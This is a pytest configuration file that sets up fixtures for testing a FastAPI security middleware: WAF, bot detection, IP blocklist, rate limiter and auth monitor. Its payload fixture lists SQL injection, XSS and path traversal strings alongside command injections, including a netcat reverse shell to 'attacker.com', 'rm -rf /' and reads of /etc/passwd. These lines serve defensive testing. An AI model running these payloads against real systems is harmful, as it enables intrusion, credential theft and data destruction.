"""
Pytest configuration and fixtures for FastAPI Guard tests
"""
import asyncio
import pytest
from unittest.mock import Mock, AsyncMock
from fastapi import FastAPI, Request
from fastapi.testclient import TestClient
import tempfile
import os

from fastapi_fortify.middleware.security import SecurityMiddleware
from fastapi_fortify.config.settings import SecurityConfig
from fastapi_fortify.protection.waf import WAFProtection
from fastapi_fortify.protection.bot_detection import BotDetector
from fastapi_fortify.protection.ip_blocklist import IPBlocklistManager
from fastapi_fortify.middleware.rate_limiter import MemoryRateLimiter
from fastapi_fortify.monitoring.auth_monitor import AuthMonitor, MemoryEventStore


@pytest.fixture
def event_loop():
    """Create an instance of the default event loop for the test session."""
    loop = asyncio.get_event_loop_policy().new_event_loop()
    yield loop
    loop.close()


@pytest.fixture
def mock_request():
    """Create a mock FastAPI Request object"""
    request = Mock(spec=Request)
    request.method = "GET"
    request.url.path = "/"
    request.url.query = ""
    request.headers = {"user-agent": "test-agent"}
    request.client.host = "127.0.0.1"
    request.body = AsyncMock(return_value=b"")
    return request


@pytest.fixture
def basic_config():
    """Basic security configuration for testing"""
    return SecurityConfig(
        waf_enabled=True,
        bot_detection_enabled=True,
        ip_blocklist_enabled=True,
        rate_limiting_enabled=True,
        auth_monitoring_enabled=True
    )


@pytest.fixture
def temp_blocklist_file():
    """Create temporary blocklist file"""
    with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
        f.write('[]')
        temp_path = f.name
    
    yield temp_path
    
    # Cleanup
    try:
        os.unlink(temp_path)
    except FileNotFoundError:
        pass


@pytest.fixture
def waf_protection():
    """Create WAF protection instance"""
    return WAFProtection(
        custom_patterns=["test_pattern"],
        block_mode=True
    )


@pytest.fixture
def bot_detector():
    """Create bot detector instance"""
    return BotDetector(
        mode="balanced",
        allow_search_bots=True,
        request_threshold=10
    )


@pytest.fixture
def ip_blocklist_manager(temp_blocklist_file):
    """Create IP blocklist manager instance"""
    return IPBlocklistManager(
        static_blocklist_file=temp_blocklist_file,
        auto_block_threshold=3
    )


@pytest.fixture
def memory_rate_limiter():
    """Create memory rate limiter instance"""
    return MemoryRateLimiter(cache_size=1000)


@pytest.fixture
def auth_monitor():
    """Create auth monitor instance"""
    return AuthMonitor(
        event_store=MemoryEventStore()
    )


@pytest.fixture
def security_middleware(basic_config):
    """Create security middleware instance"""
    return SecurityMiddleware(config=basic_config)


@pytest.fixture
def test_app():
    """Create test FastAPI application"""
    app = FastAPI()
    
    @app.get("/")
    async def root():
        return {"message": "Hello World"}
    
    @app.get("/test")
    async def test_endpoint():
        return {"test": True}
    
    @app.post("/api/data")
    async def post_data(data: dict):
        return {"received": data}
    
    return app


@pytest.fixture
def test_app_with_middleware(test_app, basic_config):
    """Create test app with security middleware"""
    test_app.add_middleware(SecurityMiddleware, config=basic_config)
    return test_app


@pytest.fixture
def test_client(test_app_with_middleware):
    """Create test client with middleware"""
    return TestClient(test_app_with_middleware)


@pytest.fixture
def malicious_payloads():
    """Common malicious payloads for testing"""
    return {
        "sql_injection": [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'/**/union/**/select/**/password/**/from/**/users--",
            "' UNION SELECT username, password FROM users --"
        ],
        "xss": [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>"
        ],
        "path_traversal": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "....//....//....//etc/passwd"
        ],
        "command_injection": [
            "; cat /etc/passwd",
            "&& whoami",
            "| nc -e /bin/sh attacker.com 4444",
            "`rm -rf /`"
        ]
    }


@pytest.fixture
def bot_user_agents():
    """Bot user agents for testing"""
    return {
        "malicious": [
            "sqlmap/1.0",
            "Nikto/2.1.6",
            "Mozilla/5.0 (compatible; Nmap Scripting Engine)",
            "python-requests/2.25.1",
            "curl/7.68.0"
        ],
        "legitimate": [
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
            "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
        ],
        "browsers": [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
        ]
    }


@pytest.fixture
def test_ips():
    """Test IP addresses for various scenarios"""
    return {
        "valid": ["192.168.1.1", "10.0.0.1", "172.16.0.1"],
        "public": ["8.8.8.8", "1.1.1.1", "208.67.222.222"],
        "invalid": ["999.999.999.999", "not.an.ip", "192.168.1"],
        "cidr": ["192.168.1.0/24", "10.0.0.0/8", "172.16.0.0/12"]
    }


@pytest.fixture
def attack_patterns():
    """Attack patterns for comprehensive testing"""
    return {
        "high_frequency": {
            "description": "High frequency requests from single IP",
            "pattern": lambda: [("GET", "/", {"user-agent": "test"}) for _ in range(100)]
        },
        "scanning": {
            "description": "Directory scanning behavior",
            "pattern": lambda: [
                ("GET", "/admin", {"user-agent": "scanner"}),
                ("GET", "/wp-admin", {"user-agent": "scanner"}),
                ("GET", "/.env", {"user-agent": "scanner"}),
                ("GET", "/config", {"user-agent": "scanner"}),
                ("GET", "/backup", {"user-agent": "scanner"})
            ]
        },
        "brute_force": {
            "description": "Brute force login attempts",
            "pattern": lambda: [
                ("POST", "/login", {"user-agent": "attack"}, {"email": f"user{i}@test.com", "password": "wrong"})
                for i in range(10)
            ]
        }
    }


class AsyncContextManager:
    """Helper for async context managers in tests"""
    def __init__(self, async_obj):
        self.async_obj = async_obj

    async def __aenter__(self):
        return self.async_obj

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        pass


@pytest.fixture
def async_context():
    """Helper for creating async context managers"""
    return AsyncContextManager